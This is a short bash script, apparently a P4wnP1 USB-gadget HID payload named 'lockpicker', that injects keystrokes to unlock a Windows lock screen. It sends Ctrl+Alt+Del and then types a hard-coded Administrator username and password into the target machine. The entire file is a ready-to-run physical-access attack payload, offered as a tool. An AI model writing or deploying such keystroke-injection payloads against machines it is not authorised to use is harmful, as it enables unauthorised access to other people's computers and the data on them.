#!/bin/bash
# payloads/hid/lockpicker.sh

### Description: Simulate Ctrl+Alt+Del + password entry to unlock Windows lock screen
### Requirements: USB gadget must include HID keyboard

USER="Administrator"
PASS="P@ssw0rd!"

echo "[+] Executing Windows lock screen unlock (HID keyboard payload)..."

/opt/p4wnp1/tools/hid_injector inject "CTRL-ALT-DEL"
sleep 2
/opt/p4wnp1/tools/hid_injector type "$USER"
sleep 1
/opt/p4wnp1/tools/hid_injector inject "ENTER"
sleep 1
/opt/p4wnp1/tools/hid_injector type "$PASS"
/opt/p4wnp1/tools/hid_injector inject "ENTER"

echo "[+] Login sequence injected. Check target device."

exit 0
